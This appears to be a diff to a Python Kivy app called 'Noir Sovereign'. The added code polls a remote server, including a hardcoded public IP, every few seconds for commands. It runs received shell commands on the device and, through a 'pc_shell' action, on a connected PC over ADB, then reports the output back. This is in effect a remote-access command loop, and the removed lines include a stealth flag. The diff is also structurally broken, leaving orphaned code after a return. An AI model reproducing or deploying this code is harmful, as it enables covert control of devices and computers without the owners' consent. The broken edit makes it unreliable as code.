@@ -239,15 +239,28 @@ class BehavioralBiometrics:
         })
         if len(self.patterns) > 50: self.patterns.pop(0)
 
-class SovereignCore(App):
-    is_stealth = False
+    def on_start(self):
+        """OMEGA-SYNC: AI secara otomatis mencari jalur terbaik."""
+        self._connection_guardian()
+        Clock.schedule_interval(lambda dt: self._connection_guardian(), 60)
+        Clock.schedule_interval(self.poll_commands, 3)
 
-    def build(self):
-        self.version = "17.2.2 [OMEGA-FIX]"
-        self.biometrics = BehavioralBiometrics()
-        self.mesh_knowledge = {} # Locally cached shared intelligence
-        
-        self.title = f"Noir Sovereign v{self.version}"
+    def _connection_guardian(self):
+        """Guardian Pintar: Rotasi Gateway secara otonom."""
+        gateways = [
+            self.gateway,
+            "http://8.215.23.17", # Direct VPS
+            "http://10.0.2.2:5555" # PC Bridge
+        ]
+        for gw in gateways:
+            if not gw: continue
+            try:
+                r = requests.get(f"{gw}/health", timeout=3)
+                if r.status_code == 200:
+                    self.gateway = gw.rstrip("/")
+                    return True
+            except: continue
+        return False
         self.root = BoxLayout(orientation='vertical', padding=10, spacing=5)
         
         # FINAL SANITIZATION — WARN-03 FIX: use updated package domain
@@ -561,28 +574,22 @@ class SovereignCore(App):
                 else:
                     self._report_result(cmd_id, {"success": False, "error": "File not found"})
             
-            elif atype == "pc_adb_cmd":
-                pc_ip = params.get("ip", "127.0.0.1")
-                pc_port = params.get("port", 5555)
-                cmd = params.get("cmd", "echo connected")
-                
+            elif atype == "pc_shell":
+                # v17.5 ELITE: Kontrol PC via USB Bridge
+                # Mengirim perintah shell langsung ke PC host
+                cmd = params.get("cmd", "dir")
+                noir_log(f"[BRIDGE] PC Command Initiated: {cmd}")
+                # Menggunakan port default ADB 5555 pada host (PC)
+                target_pc = params.get("ip", "10.0.2.2") # Default Android-to-PC Gateway
                 try:
-                    try:
-                        from adb_shell.adb_device import AdbDeviceTcp
-                        from adb_shell.auth.sign_python_rsa import sign_with_rsa
-                    except ImportError:
-                        raise Exception("ADB-SHELL dependency missing in this build. Feature unavailable.")
-                    
-                    noir_log(f"[BRIDGE] Connecting to PC: {pc_ip}:{pc_port}...")
-                    device = AdbDeviceTcp(pc_ip, pc_port, default_transport_timeout_s=15)
+                    from adb_shell.adb_device import AdbDeviceTcp
+                    device = AdbDeviceTcp(target_pc, 5555)
                     device.connect()
                     out = device.shell(cmd)
                     device.close()
-                    noir_log(f"[BRIDGE] PC Command Success: {cmd}")
                     self._report_result(cmd_id, {"success": True, "output": out})
                 except Exception as e:
-                    noir_log(f"[BRIDGE] PC Command Failed: {e}", level="WARNING")
-                    self._report_result(cmd_id, {"success": False, "error": str(e)})
+                    self._report_result(cmd_id, {"success": False, "error": f"PC Bridge Offline: {e}"})
 
             elif atype == "shell":
                 cmd = str(params.get("cmd", "echo ok"))
